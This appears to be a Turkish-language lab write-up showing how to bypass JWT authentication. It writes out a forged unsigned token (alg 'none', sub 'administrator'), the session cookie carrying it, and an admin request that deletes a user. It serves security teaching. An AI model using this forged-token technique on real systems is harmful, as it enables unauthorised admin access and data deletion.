## LAB 1 (JWT Authentication Bypass via Unverified Signature)

1. **Giriş Yap**
   `wiener:peter` hesabı ile giriş yapılır.

2. **JWT Token'ı Yakala**
   `session` çerezi içinde JWT yakalanır:
   `header.payload.signature`

3. **JWT Header'ı ve Payload'u Değiştir**
   İmzasız (`"alg": "none"`) bir token oluştur:

   * **Header:**

     ```json
     { "alg": "none" }
     ```
   * **Payload:**

     ```json
     { "sub": "administrator" }
     ```

4. **Yeni Token'ı Oluştur**
   Base64 ile encode edilir ve `signature` boş bırakılır:

   ```
   eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
   ```

5. **Token’ı Kullan**
   Bu token `session` çerezi olarak gönderilir:

   ```
   Cookie: session=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
   ```

6. **Admin Paneline Erişim**
   `/admin` yoluna istek gönderilir, `Carlos` adlı kullanıcı silinir:

   ```
   GET /admin/delete?username=carlos
   ```

---

### Zafiyet:

JWT doğrulama yapılmadan, `"alg":"none"` olarak ayarlandığında imzasız token kabul edilmekte. Bu da kimlik doğrulama bypass'ına yol açmaktadır.

---
